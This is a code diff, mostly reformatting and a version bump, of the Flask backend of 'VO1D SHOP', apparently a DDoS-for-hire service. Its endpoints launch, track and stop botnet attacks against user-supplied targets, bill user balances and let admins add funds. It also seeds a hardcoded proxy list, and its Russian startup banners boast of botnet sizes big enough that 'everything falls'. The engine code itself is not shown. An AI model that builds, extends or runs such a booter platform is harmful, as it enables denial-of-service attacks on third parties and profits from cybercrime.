                 INSERT INTO attacks (user_id, botnet_id, target, attack_type, bot_count, duration_seconds, status)
                 VALUES (?, ?, ?, ?, ?, ?, ?)
             ''', (g.user_id, botnet_id, target, attack_type, botnet['bot_count'], duration, 'running'))
-            
             attack_id = cursor.lastrowid
             conn.execute('UPDATE users SET attacks_launched = attacks_launched + 1 WHERE id = ?', (g.user_id,))
             conn.execute('UPDATE botnets SET used_count = used_count + 1, last_used = CURRENT_TIMESTAMP WHERE id = ?', (botnet_id,))
             conn.commit()
-            
             options = json.loads(botnet['options']) if botnet['options'] else {}
-            
-            thread = threading.Thread(
-                target=run_attack_async,
-                args=(attack_id, target, botnet['bot_count'], attack_type, duration, options),
-                daemon=True
-            )
+            thread = threading.Thread(target=run_attack_async, args=(attack_id, target, botnet['bot_count'], attack_type, duration, options), daemon=True)
             thread.start()
-            
             return jsonify({
                 'success': True,
                 'attack_id': attack_id,
@@ -1500,21 +1345,16 @@ def start_attack():
 def get_attack_status(attack_id):
     try:
         with get_db() as conn:
-            attack = conn.execute('''
-                SELECT * FROM attacks WHERE id = ? AND user_id = ?
-            ''', (attack_id, g.user_id)).fetchone()
+            attack = conn.execute('SELECT * FROM attacks WHERE id = ? AND user_id = ?', (attack_id, g.user_id)).fetchone()
             if not attack:
                 return jsonify({'error': 'Attack not found'}), 404
-        
         stats = {}
         if attack_id in ATTACKS:
             engine = ATTACKS[attack_id]
             stats = engine.get_stats()
-        
         if attack['status'] != 'running':
             stats_from_db = json.loads(attack['stats']) if attack['stats'] else {}
             stats.update(stats_from_db)
-        
         result = dict(attack)
         result['stats'] = stats
         result['power_level'] = get_power_level(attack['bot_count'])
@@ -1529,41 +1369,25 @@ def get_attack_status(attack_id):
 def stop_attack(attack_id):
     try:
         with get_db() as conn:
-            attack = conn.execute('''
-                SELECT * FROM attacks WHERE id = ? AND user_id = ?
-            ''', (attack_id, g.user_id)).fetchone()
+            attack = conn.execute('SELECT * FROM attacks WHERE id = ? AND user_id = ?', (attack_id, g.user_id)).fetchone()
             if not attack:
                 return jsonify({'error': 'Attack not found'}), 404
             if attack['status'] != 'running':
                 return jsonify({'error': 'Attack is not running'}), 400
-        
         if attack_id in ATTACKS:
             engine = ATTACKS[attack_id]
             engine.stop_attack()
-            
             final_stats = engine.get_stats()
-            
             with get_db() as conn:
-                conn.execute('''
-                    UPDATE attacks SET status = 'stopped', ended_at = CURRENT_TIMESTAMP, stats = ?
-                    WHERE id = ?
-                ''', (json.dumps(final_stats), attack_id))
+                conn.execute('UPDATE attacks SET status = "stopped", ended_at = CURRENT_TIMESTAMP, stats = ? WHERE id = ?',
+                             (json.dumps(final_stats), attack_id))
                 conn.commit()
-            
             if attack_id in ATTACKS:
                 del ATTACKS[attack_id]
-            
-            return jsonify({
-                'success': True,
-                'message': 'Attack stopped',
-                'stats': final_stats
-            }), 200
+            return jsonify({'success': True, 'message': 'Attack stopped', 'stats': final_stats}), 200
         else:
             with get_db() as conn:
-                conn.execute('''
-                    UPDATE attacks SET status = 'stopped', ended_at = CURRENT_TIMESTAMP
-                    WHERE id = ?
-                ''', (attack_id,))
+                conn.execute('UPDATE attacks SET status = "stopped", ended_at = CURRENT_TIMESTAMP WHERE id = ?', (attack_id,))
                 conn.commit()
             return jsonify({'success': True, 'message': 'Attack marked as stopped'}), 200
     except Exception as e:
@@ -1580,7 +1404,6 @@ def get_attack_history():
                 SELECT id, target, attack_type, bot_count, duration_seconds, status, started_at, ended_at, stats
                 FROM attacks WHERE user_id = ? ORDER BY started_at DESC LIMIT 100
             ''', (g.user_id,)).fetchall()
-            
             result = []
             for row in attacks:
                 item = dict(row)
@@ -1613,12 +1436,10 @@ def admin_get_users():
 def admin_ban_user(user_id):
     if user_id == g.user_id:
         return jsonify({'error': 'Cannot ban yourself'}), 400
-    
     try:
         with get_db() as conn:
             conn.execute('UPDATE users SET banned = 1 WHERE id = ?', (user_id,))
             conn.commit()
-            
             attacks = conn.execute('SELECT id FROM attacks WHERE user_id = ? AND status = "running"', (user_id,)).fetchall()
             for attack in attacks:
                 attack_id = attack['id']
@@ -1651,39 +1472,30 @@ def admin_add_balance():
     data = request.get_json()
     if not data:
         return jsonify({'error': 'No data provided'}), 400
-    
     username = data.get('username', '').strip()
     amount = data.get('amount', 0)
-    
     if not username:
         return jsonify({'error': 'Username required'}), 400
-    
     try:
         amount = float(amount)
     except:
         return jsonify({'error': 'Invalid amount'}), 400
-    
     if amount <= 0:
         return jsonify({'error': 'Amount must be greater than 0'}), 400
-    
     try:
         with get_db() as conn:
             user = conn.execute('SELECT id, balance FROM users WHERE username = ?', (username,)).fetchone()
             if not user:
                 return jsonify({'error': f'User "{username}" not found'}), 404
-            
             new_balance = user['balance'] + amount
             conn.execute('UPDATE users SET balance = ? WHERE id = ?', (new_balance, user['id']))
             conn.commit()
-            
             conn.execute('''
                 INSERT INTO payments (user_id, amount, method, status, created_at, completed_at)
                 VALUES (?, ?, ?, ?, ?, ?)
             ''', (user['id'], amount, 'admin_add', 'completed', datetime.now(), datetime.now()))
             conn.commit()
-            
             logger.info(f"✅ Admin added ${amount:.2f} to user '{username}' (new balance: ${new_balance:.2f})")
-            
             return jsonify({
                 'success': True,
                 'message': f'Added ${amount:.2f} to {username}',
@@ -1705,15 +1517,12 @@ def admin_get_stats():
             total_botnets = conn.execute('SELECT COUNT(*) FROM botnets').fetchone()[0]
             total_attacks = conn.execute('SELECT COUNT(*) FROM attacks').fetchone()[0]
             active_attacks = conn.execute('SELECT COUNT(*) FROM attacks WHERE status = "running"').fetchone()[0]
-            
             total_revenue = conn.execute('''
                 SELECT COALESCE(SUM(b.price), 0) FROM botnets b
                 JOIN users u ON u.id = b.user_id
                 WHERE u.role != 'admin'
             ''').fetchone()[0]
-            
             total_spent_all = conn.execute('SELECT COALESCE(SUM(total_spent), 0) FROM users WHERE role != "admin"').fetchone()[0]
-            
             return jsonify({
                 'total_users': total_users,
                 'total_botnets': total_botnets,
@@ -1743,7 +1552,7 @@ def health_check():
     return jsonify({
         'status': 'operational',
         'timestamp': datetime.now().isoformat(),
-        'version': '6.0.0',
+        'version': '6.1.0',
         'user_agents_loaded': len(USER_AGENTS),
         'max_bots': CONFIG['MAX_BOTS']
     }), 200
@@ -1762,7 +1571,6 @@ def reset_all_data_except_admin():
                 logger.error("❌ Admin VO1D not found!")
                 return False
             admin_id = admin['id']
-            
             running_attacks = cursor.execute('SELECT id FROM attacks WHERE status = "running"').fetchall()
             for attack in running_attacks:
                 attack_id = attack['id']
@@ -1772,13 +1580,11 @@ def reset_all_data_except_admin():
                         del ATTACKS[attack_id]
                     except:
                         pass
-            
             cursor.execute('DELETE FROM attacks')
             cursor.execute('DELETE FROM botnets WHERE user_id != ?', (admin_id,))
             cursor.execute('DELETE FROM payments WHERE user_id != ?', (admin_id,))
             cursor.execute('DELETE FROM users WHERE id != ?', (admin_id,))
             cursor.execute('UPDATE users SET balance = 999999.0, total_spent = 0 WHERE id = ?', (admin_id,))
-            
             cursor.execute('DELETE FROM proxies')
             proxy_list = [
                 ('http://45.32.123.45:8080', 'http', 'US'),
@@ -1795,7 +1601,6 @@ def reset_all_data_except_admin():
             ]
             for url, protocol, country in proxy_list:
                 cursor.execute('INSERT INTO proxies (url, protocol, country) VALUES (?, ?, ?)', (url, protocol, country))
-            
             conn.commit()
             logger.info("=" * 50)
             logger.info("✅ ALL DATA RESET COMPLETE!")
@@ -1845,7 +1650,7 @@ def serve_static(path):
 
 if __name__ == '__main__':
     logger.info("=" * 70)
-    logger.info("🔥 VO1D SHOP v6.0.0 — ULTIMATE POWER")
+    logger.info("🔥 VO1D SHOP v6.1.0 — ULTIMATE POWER (JWT FIXED)")
     logger.info(f"📡 User-Agents loaded: {len(USER_AGENTS)}")
     logger.info(f"🤖 Max bots: {CONFIG['MAX_BOTS']}")
     logger.info("=" * 70)
@@ -1859,8 +1664,9 @@ if __name__ == '__main__':
     logger.info("   ⚡ 50,000-199,999 ботов — ОГРОМНАЯ СИЛА")
     logger.info("   ☢️ 200,000+ ботов — ЯДЕРНЫЙ УДАР (всё падает)")
     logger.info("=" * 70)
-    logger.info("💎 НОВОЕ: Улучшенный DDoS движок с 100+ млн агентов!")
+    logger.info("💎 НОВОЕ: Улучшенный DDoS движок с 1 млн+ агентов!")
     logger.info("💎 НОВОЕ: Предупреждение при покупке 500-999 ботов!")
+    logger.info("💎 ИСПРАВЛЕНО: JWT авторизация (ключа 32+ байт)")
     logger.info("   POST /api/admin/add_balance {username, amount}")
     logger.info("=" * 70)
 
